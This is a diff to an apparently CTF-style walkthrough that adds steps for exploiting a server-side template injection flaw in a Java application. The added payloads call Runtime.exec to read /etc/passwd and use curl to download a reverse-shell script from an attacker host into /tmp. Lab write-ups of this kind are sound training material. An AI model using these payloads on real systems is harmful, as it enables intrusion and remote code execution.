@@ -22,12 +22,22 @@ Finally got a foothold to work upon....
 On trying to see id there's a SSTI vulnerability, if realized we could get a response while using the "*" special character...
 
 ![Screenshot_2022-11-20_15_40_23](https://user-images.githubusercontent.com/99975622/205445039-26d98841-5551-4ea9-9a22-6e75a0db605f.png)
+The next step was to get a reverse shell... 
+Took me a while to get a working code to help us get the reverse shell, but thanks to pentestmonkey's github repo, we got one...
+```
+*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("cat /etc/passwd ")}
+```
+Trying the above code, it works....
+
 
 Getting reverse shell,
 uploading our reverse shell script.
 ![Screenshot_2022-11-20_15_46_11](https://user-images.githubusercontent.com/99975622/205445066-872fe492-1a70-4280-8216-943e0b4a325f.png)
 
-
+I had some issues with getting the reverse shell using a one liner, so  we can upload a file and save it in the tmp directory then run bash directly on the file...
+```
+*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("curl 10.10.14.99:1000/shell.sh --output /tmp/test.sh ")}
+```
 Getting our reverse shell...
 
 
